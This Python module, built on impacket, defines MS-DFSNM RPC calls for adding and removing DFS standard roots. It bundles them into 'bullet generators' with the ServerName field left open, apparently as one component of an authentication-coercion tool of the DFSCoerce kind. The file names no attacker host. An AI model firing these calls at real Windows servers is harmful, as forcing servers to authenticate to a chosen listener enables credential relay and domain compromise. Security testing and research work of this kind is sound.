from impacket import system_errors
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD
from impacket.dcerpc.v5.rpcrt import DCERPCException

from .base import BulletGenerator


class NetrDfsAddStdRoot(NDRCALL):
    """
    Structure to make the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol
    """
    opnum = 12
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),  # Type: WCHAR *
        ('Comment', WSTR),  # Type: WCHAR *
        ('ApiFlags', DWORD),  # Type: DWORD
    )


class NetrDfsAddStdRootResponse(NDRCALL):
    """
    Structure to parse the response of the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol
    """
    structure = ()


class NetrDfsRemoveStdRoot(NDRCALL):
    """
    Structure to make the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol
    """
    opnum = 13
    structure = (
        ('ServerName', WSTR),  # Type: WCHAR *
        ('RootShare', WSTR),  # Type: WCHAR *
        ('ApiFlags', DWORD)  # Type: DWORD
    )


class NetrDfsRemoveStdRootResponse(NDRCALL):
    """
    Structure to parse the response of the RPC call to NetrDfsRemoveStdRoot() in MS-DFSNM Protocol
    """
    structure = ()


class DCERPCSessionError(DCERPCException):
    def __init__(self, error_string=None, error_code=None, packet=None):
        DCERPCException.__init__(self, error_string, error_code, packet)

    def __str__(self):
        key = self.error_code
        if key in system_errors.ERROR_MESSAGES:
            error_msg_short = system_errors.ERROR_MESSAGES[key][0]
            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]
            return 'DFSNM SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)
        else:
            return 'DFSNM SessionError: unknown error code: 0x%x' % self.error_code


bullet_generators = [
    BulletGenerator(NetrDfsAddStdRoot, {
        'ApiFlags': 0,
        'RootShare': 'CTeam\x00',
        'Comment': 'DTeam\x00'
    }, ['ServerName']),

    BulletGenerator(NetrDfsRemoveStdRoot, {
        'ApiFlags': 0,
        'RootShare': 'BTeam\x00'
    }, ['ServerName'])
]
